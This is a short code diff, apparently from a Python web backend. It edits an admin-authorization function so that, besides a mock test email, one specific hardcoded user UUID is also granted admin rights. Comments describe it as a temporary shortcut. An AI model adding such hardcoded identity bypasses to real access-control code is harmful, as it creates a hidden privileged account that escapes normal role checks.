@@ -73,7 +73,7 @@ async def get_current_admin(request: Request):
     # But for today, checking email or Mock Role is safer/faster.
     # Let's check if they belong to "Admin" group (if exists) OR hardcoded email.
     
-    if user.email == "mock.admin@test.com":
+    if user.email == "mock.admin@test.com" or user.id == "793db7d3-7996-4669-8714-8340f784085c":
         return user
         
     # Real Check: Fetch Profile -> Group
